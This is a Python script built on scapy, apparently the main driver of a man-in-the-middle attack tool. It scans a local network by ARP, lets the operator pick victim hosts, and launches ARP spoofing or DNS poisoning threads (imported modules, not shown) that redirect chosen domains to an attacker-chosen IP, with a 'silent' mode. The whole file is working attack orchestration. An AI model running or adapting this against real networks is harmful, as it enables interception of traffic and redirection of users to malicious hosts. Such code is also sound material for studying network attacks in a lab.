import sys
import threading
from scapy.all import *
from ArpSpoofing import ArpSpoofing
from DnsPoisoning import DnsPoisoning
from SilentDnsPoisoning import SilentDnsPoisoning

if __name__ == "__main__":
    #global variables
    arguments = sys.argv
    interface = "enp0s3"
    arpSpoof = None
    dnsPoison = None
    target1 = []
    target1MAC = []
    target2 = []
    target2MAC = []
    urlList = []
    oneWay = None
    silent = None
    hostToSpoof = None
    ipToSendTo = None
    url = None

    #Takes the command like argument and stores it
    modeOfAttack = arguments[1]
    timeSleep = float(arguments[2])

    print("We will start scanning the network.")
    interface = raw_input("Enter the interface you want to scan on: ")
    ips = raw_input("Enter range of IPs to scan for: (e.g 192.168.56.0/24): ")
    print("Scanning the network...")
    conf.verb = 0
    ans, unans = srp(Ether(dst= "ff:ff:ff:ff:ff:ff")/ARP(pdst = ips), timeout = 2, iface=interface, inter=0.1)
    counter = 0
    ipList = []
    macList = []
    for snt, recv in ans:
        print("index: {} IP: {} MAC: {}".format(counter,recv[ARP].psrc, recv[ARP].hwsrc))
        ipList.append(recv[ARP].psrc)
        macList.append(recv[ARP].hwsrc)
        counter += 1
    index = ""
    print("Note: if no IPs are added to Target 1, then the whole network will be selected. ")
    while index != "no":
        index = raw_input("Enter the index of the IP to add to Target 1 or 'no' if you are done adding the IPs: ")
        if index != "no":
            intIndex = int(index)
            target1.append(ipList[intIndex])
            target1MAC.append(macList[intIndex])
            index = raw_input("IP added, do you want to select more IP addresses? Write 'yes' or 'no': ")
    if len(target1) == 0:
        for i in range(len(ipList)):
            target1.append(ipList[i])
            target1MAC.append(macList[i])
    index2 = ""
    print("Note: if no IPs are added to Target 2, then the whole network will be selected. ")
    while index2 != "no":
        index2 = raw_input("Enter the index of the IP to add to Target 2 or 'no' if you are done adding the IPs: ")
        if index2 != "no":
            intIndex2 = int(index2)
            target2.append(ipList[intIndex2])
            target2MAC.append(macList[intIndex2])
            index2 = raw_input("IP added, do you want to select more IP addresses? Write 'yes' or 'no': ")
    if len(target2) == 0:
        for i in range(len(ipList)):
            target2.append(ipList[i])
            target2MAC.append(macList[i])

    with open('target1ListIP.txt', 'w') as file1:
        for item in target1:
            file1.write('%s\n' % item)

    with open('target2ListIP.txt', 'w') as file2:
        for item in target2:
            file2.write('%s\n' % item)

    with open('target1ListMAC.txt', 'w') as file3:
        for item in target1MAC:
            file3.write('%s\n' % item)

    with open('target2ListMAC.txt', 'w') as file4:
        for item in target2MAC:
            file4.write('%s\n' % item)

    if modeOfAttack == "arp":
        oneWayQuestion = raw_input("Only poison one-way? Write 'yes' or 'no': ")
        if oneWayQuestion == "yes":
            oneWay = True
        elif oneWayQuestion == "no":
            oneWay = False
        silentQuestion = raw_input("Perform attack in silent mode? Write 'yes' or 'no': ")
        if silentQuestion == "yes":
            silent = True
        elif silentQuestion == "no":
            silent = False
    elif modeOfAttack == "dns":
        index2 = ""
        ipSendTo = raw_input("Please enter IP address to which the URL must go to: ")
        ipToSendTo = ipSendTo
        newUrl = "no"
        print("Note: if no URLs are added, then every URL request will be spoofed. ")
        while newUrl != "no":
            newUrl = raw_input("Enter the URL you want to add to DNS spoof list or 'no' if you are done adding: ")
            if newUrl != "no":
                urlList.append(newUrl)
                newUrl = raw_input("URL added, do you want to add more URLs? Write 'yes' or 'no': ")
        silentQuestion = raw_input("Perform attack in silent mode? Write 'yes' or 'no': ")
        if silentQuestion == "yes":
            silent = True
        elif silentQuestion == "no":
            silent = False
    else:
        print("Wrong mode of attack provided choose out of: arp or dns")
        sys.exit(1)

    if modeOfAttack == "arp":
        stop_event = threading.Event()
        arpSpoofing = ArpSpoofing(interface)
        try:
            arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof, args=(target1, target2, target1MAC, target2MAC, oneWay, silent, timeSleep, stop_event))
            arpSpoof.daemon = True
            arpSpoof.start()
        except:
            print("Thread 'arp poisoning' failed to start")
    elif modeOfAttack == "dns":
        stop_event = threading.Event()
        if silent:
            dnsPoisoning = SilentDnsPoisoning(interface)
            try:
                dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison,
                                             args=(target1, target2, target1MAC, target2MAC, urlList, ipToSendTo, timeSleep, stop_event))
                dnsPoison.daemon = True
                dnsPoison.start()
            except:
                print("Thread 'dns poisoning' failed to start")
        else:
            dnsPoisoning = DnsPoisoning(interface)
            try:
                dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison,
                                             args=(target1, target2, target1MAC, target2MAC, urlList, ipToSendTo, stop_event))
                dnsPoison.daemon = True
                dnsPoison.start()
            except:
                print("Thread 'dns poisoning' failed to start")


    else:
        print("Wrong mode of attack provided choose out of: arp, dns or all")
        sys.exit(1)

    if modeOfAttack == "arp":
        print("Enter any text to stop poisoning: ")
        killDns = raw_input("")
        print("Stopping the ARP poisoning...")
        stop_event.set()
        arpSpoof.join()
    elif modeOfAttack == "dns":
        print("Enter any text to stop poisoning")
        killDns = raw_input("")
        print("Stopping the DNS poisoning...")
        stop_event.set()
        dnsPoison.join()
    print("Reached end of the main file ")
